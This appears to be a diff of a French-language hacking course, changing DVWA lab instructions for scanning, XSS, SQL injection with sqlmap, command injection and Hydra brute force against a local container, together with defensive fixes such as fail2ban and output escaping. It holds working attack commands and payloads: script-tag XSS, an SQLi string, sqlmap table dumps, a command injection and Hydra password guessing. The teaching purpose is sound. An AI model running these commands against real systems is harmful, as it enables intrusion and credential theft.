@@ -316,7 +316,7 @@ admin' OR '1'='1' --
 
 ## Lab 1.1 — Scan et découverte de DVWA
 
-###  Fiche
+### Fiche
 
 | Durée | Conteneur | Dossier | Outils |
 |---|---|---|---|
@@ -395,16 +395,16 @@ La reconnaissance ennemie se contrecarre en **réduisant la surface d'attaque** 
 # bash -c '...' = lance un nouveau shell bash et exécute la chaîne de commandes entre guillemets
 # apache2ctl restart = redémarre le serveur web Apache (pour appliquer les changements de configuration)
 docker exec dvwa-target bash -c "echo 'Options -Indexes' >> /etc/apache2/conf-enabled/security.conf && apache2ctl restart"
-# Vérification : gobuster trouve moins de répertoires exposés
-gobuster dir -u http://localhost:8088 -w /usr/share/wordlists/dirb/common.txt -q 2>/dev/null | head -3
-# → La surface d'attaque visible est réduite
+# Vérification : tenter d'accéder à un répertoire sans index.html ne liste plus son contenu
+curl -s -I "http://localhost:8088/" 2>/dev/null | grep -i "200\|403"
+# → 403 Forbidden  (le directory listing est désactivé, l'attaquant ne voit plus la structure)
 ```
 
 ---
 
 ## Lab 1.2 — Exploitation XSS
 
-###  Fiche
+### Fiche
 
 | Durée | Conteneur | Technique ATT&CK |
 |---|---|---|
@@ -452,7 +452,7 @@ Message: <script>alert('Stored XSS')</script>
 ```
 → Popup à chaque rafraîchissement. Stocké en base.
 
-###  Contre-mesure (M1013 Application Hardening + M1054 Secure Coding)
+### 🔒 Contre-mesure (M1013 Application Hardening + M1054 Secure Coding)
 
 | Attaque | Défense | Code de correction |
 |---|---|---|
@@ -474,7 +474,8 @@ docker exec dvwa-target bash -c "grep 'session.cookie_httponly' /etc/php/*/apach
 curl -s -b /tmp/dvwa_cookie.txt \
   "http://localhost:8088/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E" 2>/dev/null \
   | grep -o "&lt;script&gt;\|alert"
-# → &lt;script&gt;alert(1)&lt;/script&gt;  (le code HTML est échappé, pas exécuté par le navigateur)
+# → &lt;script&gt;   (grep -o affiche chaque match sur une ligne séparée)
+# → alert         (le HTML est échappé, pas exécuté par le navigateur)
 ```
 
 > **Checkpoint défensif :** `htmlspecialchars()` + `HttpOnly` neutralisent l'XSS : plus de popup, cookie inaccessible.
@@ -483,7 +484,7 @@ curl -s -b /tmp/dvwa_cookie.txt \
 
 ## Lab 1.3 — Injection SQL avec sqlmap
 
-###  Fiche
+### Fiche
 
 | Durée | Conteneur | Technique ATT&CK |
 |---|---|---|
@@ -512,11 +513,11 @@ curl -s -b /tmp/dvwa_cookie.txt \
 ```bash
 cd ~/cours-hacking/jour-1/labs
 
-# sqlmap : --cookie-file = charge les cookies depuis le fichier jar au format Netscape (PHPSESSID + security=low)
+# sqlmap : --load-cookies = charge les cookies depuis le fichier jar au format Netscape (PHPSESSID + security=low)
 # -u = URL cible, -D = base de données cible (dvwa), -T users = table cible
 # -C user,password = colonnes à extraire, --dump = affiche le contenu, --batch = mode non-interactif
 sqlmap -u "http://localhost:8088/vulnerabilities/sqli/?id=1&Submit=Submit" \
-  --cookie-file=/tmp/dvwa_cookie.txt \
+  --load-cookies=/tmp/dvwa_cookie.txt \
   -D dvwa -T users -C user,password --dump --batch
 ```
 Sortie attendue :
@@ -565,7 +566,7 @@ L'injection SQL se corrige en **ne concaténant jamais l'entrée utilisateur dan
 
 ## Lab 1.4 — Command Injection + Reverse Shell
 
-###  Fiche
+### Fiche
 
 | Durée | Conteneur | Technique ATT&CK |
 |---|---|---|
@@ -654,7 +655,7 @@ curl -s "http://localhost:8088/vulnerabilities/exec/" --data "ip=127.0.0.1;whoam
 
 ## Lab 1.5 — SQLi avancée : Trouver, Exploiter, Craquer
 
-###  Fiche
+### Fiche
 
 | Durée | Conteneur | Dossier | Techniques |
 |---|---|---|---|
@@ -931,7 +932,7 @@ sqlmap -u "http://localhost:8083/?page=search&id=1" --batch 2>&1 | grep -i "inje
 
 ## Lab 1.6 — Attaque par force brute avec Hydra
 
-###  Fiche
+### Fiche
 
 | Durée | Conteneur | Dossier | Technique ATT&CK |
 |---|---|---|---|
@@ -987,9 +988,10 @@ cd ~/cours-hacking/jour-1/labs
 #   2. "username=^USER^&password=^PASS^&Login=Login" = champs avec variables
 #      ^USER^ et ^PASS^ = remplacés par Hydra à chaque tentative
 #   3. "Login failed" = chaîne F= (Fail) détectée dans la réponse pour un échec
-# 🔍 -V = verbeux (affiche chaque tentative), | tee = sauvegarde la sortie
+# 🔍 -V = verbeux (affiche chaque tentative), -s = port non standard
+# 🔍 2>&1 | tee = capture stdout+stderr ET affiche dans le terminal
 hydra -l admin -P /usr/share/wordlists/rockyou.txt \
-  localhost http-post-form \
+  -s 8088 localhost http-post-form \
   "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V 2>&1 \
   | tee hydra_dvwa.txt
 ```
@@ -997,7 +999,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt \
 Sortie attendue :
 
 ```console
-[80][http-post-form] host: localhost   login: admin   password: password
+[8088][http-post-form] host: localhost   login: admin   password: password
 [STATUS] attack finished for localhost (valid pair found)
 1 of 1 target successfully completed, 1 valid password found
 ```
@@ -1014,8 +1016,9 @@ echo -e "admin\ntest\nroot\nuser\nadministrateur" > /tmp/logins.txt
 # 🔍 -L = fichier contenant plusieurs logins à tester
 # 🔍 -P = wordlist de mots de passe (rockyou.txt)
 # 🔍 -F = s'arrêter au premier couple valide trouvé (exit on first find)
+# 🔍 -s = port non standard (DVWA sur 8088)
 hydra -L /tmp/logins.txt -P /usr/share/wordlists/rockyou.txt \
-  localhost http-post-form \
+  -s 8088 localhost http-post-form \
   "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -F 2>&1 \
   | tee hydra_multi.txt
 ```
@@ -1023,7 +1026,7 @@ hydra -L /tmp/logins.txt -P /usr/share/wordlists/rockyou.txt \
 Sortie attendue :
 
 ```console
-[80][http-post-form] host: localhost   login: admin   password: password
+[8088][http-post-form] host: localhost   login: admin   password: password
 [STATUS] attack finished for localhost (valid pair found)
 ```
 
@@ -1063,8 +1066,8 @@ docker exec dvwa-target bash -c "fail2ban-client status apache-dvwa"
 # → Status for the jail: apache-dvwa  |  Currently banned: 0  (prêt à bloquer)
 
 # 📌 Re-tester Hydra après fail2ban : après 5 échecs, l'IP est bannie
-# hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" 2>&1 | head -5
-# → [ERROR] target localhost:80 - connection refused!  (l'IP est bannie)
+# hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8088 localhost http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" 2>&1 | head -5
+# → [ERROR] target localhost:8088 - connection refused!  (l'IP est bannie)
 ```
 
 > **Checkpoint défensif :** Avec fail2ban actif, Hydra ne peut plus tester que 5 mots de passe avant le banissement temporaire. Le brute-force est neutralisé à l'échelle réseau.
